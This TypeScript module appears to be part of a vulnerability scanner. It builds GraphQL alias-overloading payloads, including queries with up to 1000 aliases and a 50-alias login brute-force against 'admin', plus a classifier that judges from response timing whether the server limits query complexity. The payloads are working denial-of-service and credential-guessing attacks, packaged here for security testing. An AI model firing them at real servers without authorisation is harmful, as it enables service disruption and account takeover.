// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'graphql-alias-overload',
  family: 'graphql-attack',
  title: 'GraphQL alias query overloading (DoS / resource exhaustion)',
  severity: 'medium',
  destructiveRisk: 'low',
  requiresOast: false,
  requiresBrowser: false,
  insertionPointKinds: ['body', 'graphql'],
  expectedSignals: ['timing-delta', 'resource-exhaustion', 'multiple-responses'],
  cwe: [770],
};

function makeAliasQuery(count: number, field: string): string {
  const aliases = Array.from({ length: count }, (_, i) => `a${i}: ${field}`).join(' ');
  return `{"query":"{ ${aliases} }"}`;
}

export function variants(_ctx: ProbeContext): PayloadVariant[] {
  return [
    {
      id: 'gql-alias-10-typename',
      family: 'graphql-attack',
      value: makeAliasQuery(10, '__typename'),
      encoding: 'json-string',
      intent: '10 aliased __typename — cheap probe to test alias acceptance',
      destructiveRisk: 'none',
      expectedSignals: ['multiple-responses'],
    },
    {
      id: 'gql-alias-100-typename',
      family: 'graphql-attack',
      value: makeAliasQuery(100, '__typename'),
      encoding: 'json-string',
      intent: '100 aliased __typename — amplified resolver cost probe',
      destructiveRisk: 'low',
      expectedSignals: ['timing-delta', 'resource-exhaustion'],
    },
    {
      id: 'gql-alias-500-typename',
      family: 'graphql-attack',
      value: makeAliasQuery(500, '__typename'),
      encoding: 'json-string',
      intent: '500 aliased __typename — aggressive resource exhaustion probe',
      destructiveRisk: 'low',
      expectedSignals: ['timing-delta', 'resource-exhaustion'],
    },
    {
      id: 'gql-alias-login-50',
      family: 'graphql-attack',
      value: `{"query":"{ ${Array.from({ length: 50 }, (_, i) => `a${i}: login(username:\\"admin\\",password:\\"attempt${i}\\"){ token }`).join(' ')} }"}`,
      encoding: 'json-string',
      intent: '50-alias login mutation for credential brute-force within single query',
      destructiveRisk: 'none',
      expectedSignals: ['multiple-responses', 'timing-delta'],
    },
    {
      id: 'gql-alias-nested-100',
      family: 'graphql-attack',
      value: `{"query":"{ ${Array.from({ length: 100 }, (_, i) => `n${i}: __schema { types { name } }`).join(' ')} }"}`,
      encoding: 'json-string',
      intent: '100 aliased __schema queries — amplified schema fetches',
      destructiveRisk: 'low',
      expectedSignals: ['timing-delta', 'resource-exhaustion'],
    },
    {
      id: 'gql-alias-check-limit',
      family: 'graphql-attack',
      value: makeAliasQuery(1000, '__typename'),
      encoding: 'json-string',
      intent: '1000 aliases — detect whether server enforces alias/complexity limits',
      destructiveRisk: 'low',
      expectedSignals: ['resource-exhaustion', 'timing-delta'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const timingDelta = resp.responseTimeMs - baseline.responseTimeMs;
  const hasErrors = resp.bodyText.includes('"errors"');
  const hasData = resp.bodyText.includes('"data"');

  if (timingDelta > 5000 && hasData) {
    responseClass = 'timing-delta';
    confidence = 0.8;
    nextAction = 'promote-finding';
    evidence.push(`Alias overload timing delta ${timingDelta}ms — server executed all ${variant.id} aliases without limit`);
  } else if (timingDelta > 2000) {
    responseClass = 'timing-delta';
    confidence = 0.6;
    nextAction = 'confirm';
    evidence.push(`Marginal timing delta ${timingDelta}ms for alias overload ${variant.id}`);
  } else if (hasErrors && resp.bodyText.toLowerCase().includes('complexity')) {
    responseClass = 'method-or-parser-rejected';
    confidence = 0.9;
    nextAction = 'stop-negative';
    evidence.push('Server enforces query complexity limits — alias overload blocked');
  } else if (resp.statusCode === 200 && hasData) {
    responseClass = 'observed-value';
    confidence = 0.5;
    nextAction = 'confirm';
    evidence.push('Alias query accepted but no timing signal — may need larger alias count');
  } else {
    nextAction = 'continue';
    evidence.push(`No alias overload signal for ${variant.id}`);
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
